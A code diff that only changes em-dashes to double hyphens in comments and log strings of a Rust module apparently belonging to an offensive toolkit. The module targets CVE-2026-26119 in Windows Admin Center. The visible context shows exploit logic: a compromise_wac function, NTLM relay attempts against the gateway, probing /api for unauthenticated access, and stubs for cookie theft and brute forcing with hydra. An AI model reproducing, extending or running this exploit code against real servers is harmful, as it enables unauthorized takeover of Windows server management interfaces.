@@ -1,4 +1,4 @@
-//! CVE-2026-26119 — Windows Admin Center (WAC) Authentication Reflection.
+//! CVE-2026-26119 -- Windows Admin Center (WAC) Authentication Reflection.
 //!
 //! Windows Admin Center (WAC) is a browser-based management tool for Windows
 //! Server. When WAC is configured with Windows Authentication and a user
@@ -108,7 +108,7 @@ fn build_client(config: &WacCompromiseConfig) -> Result<reqwest::Client> {
 pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromiseResult> {
     let mut log = Vec::new();
     log.push(format!(
-        "CVE-2026-26119: WAC Compromise — target={}:{}",
+        "CVE-2026-26119: WAC Compromise -- target={}:{}",
         config.target_host, config.target_port
     ));
 
@@ -266,12 +266,12 @@ async fn attempt_wac_access(
                     .await;
                 match resp {
                     Ok(r) if r.status().is_success() => {
-                        info!("NTLM relay succeeded — session established");
+                        info!("NTLM relay succeeded -- session established");
                         Ok((true, Some(login_url)))
                     }
                     Ok(r) if r.status().as_u16() == 401 => {
                         info!(
-                            "NTLM relay rejected (401) — WAC requires interactive auth or Kerberos"
+                            "NTLM relay rejected (401) -- WAC requires interactive auth or Kerberos"
                         );
                         Ok((false, None))
                     }
@@ -290,11 +290,11 @@ async fn attempt_wac_access(
                 let probe_url = format!("{base}/api");
                 match client.get(&probe_url).timeout(HTTP_TIMEOUT).send().await {
                     Ok(r) if r.status().is_success() => {
-                        info!("Unauthenticated access allowed — gateway not locked down");
+                        info!("Unauthenticated access allowed -- gateway not locked down");
                         Ok((true, Some(probe_url)))
                     }
                     Ok(r) if r.status().as_u16() == 401 => {
-                        info!("Gateway requires auth (401) — provide ntlm_hash for relay");
+                        info!("Gateway requires auth (401) -- provide ntlm_hash for relay");
                         info!("  Example: compromise_wac config with ntlm_hash set");
                         Ok((false, None))
                     }
@@ -334,11 +334,11 @@ async fn attempt_wac_access(
             }
         }
         WacAuthMethod::CookieTheft => {
-            info!("Cookie theft requires MITM position — not automated");
+            info!("Cookie theft requires MITM position -- not automated");
             Ok((false, None))
         }
         WacAuthMethod::BruteForce => {
-            info!("Brute force not implemented — use external tool (hydra)");
+            info!("Brute force not implemented -- use external tool (hydra)");
             Ok((false, None))
         }
     }
